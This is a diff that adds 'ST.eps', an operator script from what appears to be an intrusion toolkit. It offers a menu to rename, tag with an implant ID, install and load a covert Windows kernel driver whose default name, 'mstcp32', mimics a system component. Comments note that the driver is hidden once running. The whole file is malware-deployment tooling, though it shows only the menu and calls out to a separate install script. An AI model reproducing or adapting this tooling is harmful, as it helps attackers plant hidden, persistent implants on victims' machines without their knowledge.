@@ -1,0 +1,98 @@
+#--------------------------------------------------------
+# File: ST.eps
+#
+# Configures/Installs ST.
+#--------------------------------------------------------
+
+@echo off;
+
+if ($argc != 2) {
+    echo "Usage: $argv[0] <stVersion>";
+    return false;
+}
+
+string $stVersion = $argv[1];
+
+# defaults
+# we can change this to anything through the menu below 
+string $driverName = "mstcp32";
+
+# this looks like uninit'd memory on windows, this is also the default that is stored in the image
+string $impId = "0xcdcdcdcd";		
+
+# commands
+int $installCmdsStart = 1;
+int $normalCmdsStart = 8;
+int $controlCmdsStart = 8;
+int $captureCmdsStart = 16;
+string $commands;
+$commands[0] = "Quit";
+
+# start of "install" commands
+# NOTE: we don't have a verify or uninstall since once the driver is running, it is hidden 
+# and EP doesn't have sufficient rights to see it. 
+$commands[1] = "Change driver name (use before installing)";
+$commands[2] = "Set implant ID     (use before installing)";
+$commands[3] = "Install driver     (use before loading)";
+$commands[4] = "Load driver        (use after installing)";
+
+@record on;
+
+while (true) {
+    echo "\r\n\r\n";
+
+    # Print the current configuration
+    echo "Current Configuration:";
+    echo "\tDriver name : $driverName";
+    echo "\tImplant ID  : $impID"; 
+	echo "\tVersion     : $stVersion";
+    echo "";
+
+    # print the command list
+    int $i=0;
+    echo "Installation commands:";
+    while ($i < sizeof($commands)) {
+	echo "($i). $commands[$i]";
+	$i++;
+    }
+
+    echo "";
+    int $choice = GetInput("Enter the desired option");
+    if ($choice == 0) {
+	# quit
+	return true;
+    } else if ($choice == 1) {
+	# Change driver name
+	echo "Current driver name = '$driverName'";
+	$driverName = GetInput("Enter new driver name (must be 8 characters or less)");
+    } else if ($choice == 2) {
+	# set the ID
+	echo "Current Implant ID = '$impID'";
+	$impID = GetInput("Enter new Implant ID (pls use hex 0x########)");
+    } else if ($choice == 3) {
+	# install driver
+	if (`script ST\\Install.eps $stVersion $driverName $impID`) {
+	    echo "INSTALL SUCCESS";
+	    echo "";
+	    echo "NOTE: The driver has not been loaded";
+	} else {
+	    echo "**** INSTALL FAILED ****";
+	}
+    } else if ($choice == 4) {
+	# load the driver
+	if (prompt "Load the driver ($driverName)?") {
+	    @echo on;
+	    `driverload -name $driverName`;
+	    @echo off;
+	}
+    } else {
+	# invalid choice
+	echo "*** Invalid choice ***";
+    }
+
+    pause;
+}
+
+@record off;
+
+return true;
